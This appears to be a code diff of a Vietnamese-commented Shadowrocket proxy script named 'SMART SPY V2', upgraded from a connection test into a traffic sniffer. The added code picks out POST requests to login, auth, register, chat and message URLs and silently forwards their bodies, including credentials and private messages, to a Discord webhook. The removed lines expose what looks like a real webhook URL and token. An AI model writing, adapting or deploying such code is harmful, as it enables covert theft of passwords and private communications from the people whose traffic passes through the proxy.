@@ -1,34 +1,66 @@
-/* DEBUG SCRIPT: KIỂM TRA PHẢN HỒI TỪ DISCORD 
-   File: smart_spy.js
-*/
+/**
+ * SMART SPY V2 - CHỈ BẮT LOGIN & TIN NHẮN
+ * Tác giả: TungTinTacKMA (Updated)
+ */
 
-var request = $request;
-var url = request.url;
+var url = $request.url;
+var body = $request.body;
+var method = $request.method;
 
-// --- DÁN LINK WEBHOOK MỚI CỦA BẠN VÀO DƯỚI ---
-var webhookUrl = "https://discordapp.com/api/webhooks/1454906156777472165/tLAGpqP0YKRK0HjgzhHat-CTb3s6OMiFrPqzse_KZ8NfD16FsgXiNmKbqxyqyaKPX1ST";
-
-var payload = {
-    "content": "🚨 **TEST KẾT NỐI:** Shadowrocket đã bắt được request!\nTarget: `" + url + "`"
-};
-
-$httpClient.post({
-    url: webhookUrl,
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-}, function(error, response, data) {
-    
-    // LOG CHI TIẾT ĐỂ BẮT LỖI
-    if (error) {
-        console.log("❌ LỖI MẠNG: " + error);
-    } else {
-        // Kiểm tra xem Discord có chấp nhận không (Status phải là 204 hoặc 200)
-        if (response.status == 204 || response.status == 200) {
-            console.log("✅ GỬI THÀNH CÔNG! (Kiểm tra Discord ngay)");
-        } else {
-            console.log("⚠️ DISCORD TỪ CHỐI! Mã lỗi: " + response.status);
-            console.log("Phản hồi từ Discord: " + data); // In ra lý do tại sao lỗi
-        }
-    }
+// 1. DANH SÁCH BỎ QUA (RÁC)
+// Nếu link chứa đuôi ảnh, nhạc, font, css... -> Bỏ qua ngay lập tức để game load nhanh
+if (url.match(/\.(jpeg|jpg|png|gif|webp|svg|css|js|woff|woff2|ttf|mp3|wasm)$/i)) {
     $done({});
-});
+} 
+// 2. CHỈ BẮT CÁC GÓI TIN QUAN TRỌNG
+// Chỉ lấy nếu là phương thức POST (gửi dữ liệu) VÀ chứa từ khóa nhạy cảm
+else if (method === "POST" && (
+    url.includes("login") ||       // Bắt đăng nhập
+    url.includes("auth") ||        // Bắt xác thực
+    url.includes("chat") ||        // Bắt tin nhắn
+    url.includes("message") ||     // Bắt tin nhắn
+    url.includes("register")       // Bắt đăng ký
+)) {
+    sendToDiscord(url, body);
+    $done({}); // Cho phép gói tin đi tiếp ngay để không bị lag game
+} 
+// 3. CÁC LINK KHÁC -> BỎ QUA
+else {
+    $done({});
+}
+
+function sendToDiscord(targetUrl, capturedData) {
+    // Thay WEBHOOK_URL của bạn vào đây
+    var discordUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"; 
+    
+    var data = {
+        "username": "Shadow Hunter",
+        "avatar_url": "https://i.imgur.com/4M34hi2.png",
+        "embeds": [{
+            "title": "🎯 ĐÃ BẮT ĐƯỢC MỤC TIÊU!",
+            "color": 16711680,
+            "fields": [
+                {
+                    "name": "🌐 Đang truy cập:",
+                    "value": "`" + targetUrl + "`"
+                },
+                {
+                    "name": "🔑 Dữ liệu thu được:",
+                    "value": "```json\n" + capturedData + "\n```"
+                }
+            ],
+            "footer": {
+                "text": "Shadowrocket Sniffer | Time: " + new Date().toLocaleTimeString()
+            }
+        }]
+    };
+
+    $task.fetch({
+        url: discordUrl,
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    }, function(error, response, data) {
+        // Gửi ngầm, không cần log ra console để tránh spam
+    });
+}
